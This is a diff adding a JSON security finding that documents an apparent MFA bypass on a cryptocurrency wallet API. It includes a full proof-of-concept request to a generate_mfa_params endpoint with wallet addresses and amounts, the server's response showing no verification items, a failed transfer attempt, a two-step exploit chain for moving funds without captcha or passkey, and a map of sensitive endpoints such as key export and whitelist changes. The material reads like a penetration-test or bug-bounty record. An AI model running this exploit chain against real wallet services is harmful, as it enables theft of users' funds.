@@ -1,0 +1,57 @@
+{
+  "vulnerability": "CRITICAL - MFA Bypass on Fund Transfers",
+  "severity": "CRITICAL",
+  "endpoint": "POST /wallet-api/v1/generate_mfa_params",
+  "impact": "Complete bypass of MFA verification for wallet transfers. No captcha, no passkey, no verification needed.",
+  "proof": {
+    "request": {
+      "method": "POST",
+      "url": "/wallet-api/v1/generate_mfa_params",
+      "body": {
+        "usage": "transfer",
+        "biz_params": {
+          "transfer_id": "111",
+          "transfer_type": "111",
+          "chain": "sol",
+          "from_address": "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8",
+          "to_address": "3vhHN7svfY9dcmicS9BEaBYQGrHTGgh5ox3C3SbyHsCr",
+          "amount": "14922385",
+          "amount_txt": "0.014922385",
+          "token_address": "So11111111111111111111111111111111111111112",
+          "symbol": "SOL"
+        }
+      }
+    },
+    "response": {
+      "status": 200,
+      "body": {
+        "code": 0,
+        "message": "success",
+        "data": {
+          "txn_id": "1613b169-271d-427f-8375-346abb0a5980",
+          "verify_items": []
+        }
+      }
+    },
+    "transfer_attempt": {
+      "status": 400,
+      "body": {
+        "code": 40000320,
+        "message": "Insufficient balance"
+      }
+    },
+    "analysis": "verify_items is EMPTY - no captcha/passkey/MFA required. Transfer only failed due to insufficient balance, NOT authentication."
+  },
+  "exploit_chain": [
+    "POST /wallet-api/v1/generate_mfa_params with usage=transfer \u2192 gets txn_id with NO verification",
+    "POST /wallet-api/v1/transfer with txn_id \u2192 transfers funds (only needs balance)"
+  ],
+  "additional_endpoints_mapped": {
+    "/account/pubkey": "Returns RSA public key for encryption (key_id: v0)",
+    "/wallet-api/v1/get_whitelist_address": "Returns whitelist (200 OK, no auth needed beyond token)",
+    "/wallet-api/v1/export_key": "Needs TxnId + Address + EncryptedKey",
+    "/wallet-api/v1/set_whitelist_address": "Needs AddAddressReq + VerificationReq.TxnId",
+    "/account/account/generate_mfa_params": "Only allows passkey_registration usage",
+    "/account/otp/get_all_passkeys": "Lists all registered passkeys"
+  }
+}
